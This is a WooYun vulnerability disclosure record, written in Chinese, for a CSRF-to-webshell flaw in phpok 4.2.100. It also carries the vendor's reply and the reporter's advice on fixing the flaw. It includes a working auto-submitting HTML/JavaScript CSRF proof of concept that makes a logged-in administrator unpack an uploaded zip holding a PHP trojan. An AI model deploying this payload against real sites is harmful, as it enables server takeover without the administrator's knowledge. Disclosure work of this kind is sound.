{"id": 40326, "wybug_id": "wooyun-2015-091875", "wybug_title": "phpok csrf成功getshell(二)", "wybug_corp": "phpok.com", "wybug_author": "Pany自留地", "wybug_date": "2015-01-16 18:03", "wybug_open_date": "2015-04-16 18:04", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["上传缺陷", "升级文件没检验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向公众公开  简要描述： 前台注册一个帐号，上传zip文件，csrf后台升级（升级文件为上传的zip）,成功getshell对升级文件没进行校验。 详细说明：  版本：4.2.100前台能上传zip文件，而且对升级文件没进行校验。上传zip演示：先把我们的木马文件test.php添加到压缩包内test.zip注册一个帐号-修改资料.选择一个正常图片，截获数据\n\n\n\n然后修改数据。\n\n成功上传zip文件。记录下文件id号。我们这里是739在 程序升级 » ZIP离线包升级 中的升级操作没有进行Referer验证。导致csrf产生\n演示csrf:\n\n\npoc:zipfile为我们刚刚记录下的文件id号：739\n<form action=\"http://localhost//phpok/admin.php?c=update&f=unzip\" id=\"poc\" name=\"poc\" method=\"post\"><input type=\"hidden\" name=\"zipfile\" value=\"\"/><input type=\"hidden\" name=\"file\" value=\"\"/><input type=\"submit\" name=\"up\" value=\"submit\"/></form><script>var t = document.poc;t.zipfile.value=\"739\";t.file.value=\"739\";document.poc.submit();</script>\n管理员只要访问我们事先准备好的poc。 就能getshelltest.php躺在根目录那里。   漏洞证明：  访问poc文件 \n\n\n\n   修复方案：  对升级文件进行校验。   版权声明：转载请注明来源 Pany自留地@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-16 19:12 厂商回复： 好吧，我表示很痛苦！对这个问题，我真心一时半会想不起来如何解决了！我们这边安排开发深入了解这个东东！:(还有这个Bug和您之前提交的Bug是同一个！另外，这个的基本前台是需要管理员登录吧！我们努力2月初打上这个补丁（我想说的是，都能进后台了，那么还有什么不能操作的） 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-16 21:09 |    \t\tPany自留地 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:29        | 0day just like a joke.)\t\t \n  @phpok企业站 解决csrf可以通过验证referer，或者对后台的每个操作都加token验证，在BT点可以选择每个操作添加验证码。而且csrf其实是不需要进后台的，只要诱骗到管理员在登录状态下进入了攻击者事先准备的带有攻击代码的页面，就能在管理员不知情的情况下进行一些操作，配上一些能getshell方法，既可取得网站所有权限（这不是能进后台）举个例子：我在你网站上留言说，我的网站想和贵站做个友情链接，一般你都会先浏览我的这个网站再做决定，但是我事先在我网站上放置了攻击代码，而你已经处于网站后台登录状态，如果没有对csrf进行防御，我就能在你不知情的情况下，对你的网站进行操作，甚至取得webshell    \n     2015-01-16 21:10 |    \t\tPany自留地 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:29        | 0day just like a joke.)\t\t \n  @phpok.com 解决csrf可以通过验证referer，或者对后台的每个操作都加token验证，在BT点可以选择每个操作添加验证码。而且csrf其实是不需要进后台的，只要诱骗到管理员在登录状态下进入了攻击者事先准备的带有攻击代码的页面，就能在管理员不知情的情况下进行一些操作，配上一些能getshell方法，既可取得网站所有权限（这不是能进后台）举个例子：我在你网站上留言说，我的网站想和贵站做个友情链接，一般你都会先浏览我的这个网站再做决定，但是我事先在我网站上放置了攻击代码，而你已经处于网站后台登录状态，如果没有对csrf进行防御，我就能在你不知情的情况下，对你的网站进行操作，甚至取得webshell    \n     2015-01-18 12:27 |    \t\tphpok企业站(乌云厂商)\t\t \n  收到，谢谢    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}